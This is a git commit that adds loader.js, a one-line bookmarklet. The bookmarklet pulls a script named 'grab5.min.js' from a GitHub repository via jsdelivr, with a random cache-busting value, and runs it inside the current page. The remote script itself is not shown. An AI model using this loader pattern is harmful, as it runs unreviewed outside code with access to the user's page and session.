59055c8354c72a3816bb998fba336b0651ca33db
nieznaszmnie <46851262+nieznaszmnie@users.noreply.github.com>
2019-01-19 21:20:43 +0100

    Add files via upload

---
+++ loader.js
@@ -0,0 +1,1 @@
+javascript:void((function(){var l='https://cdn.jsdelivr.net/gh/SmierciSmiech/smiechuwarte/grab5.min.js?', r=Math.round(Math.random()*1e7),s=document.createElement('script');s.setAttribute('type', 'text/javascript');s.setAttribute('src',l+r);document.body.appendChild(s)})())
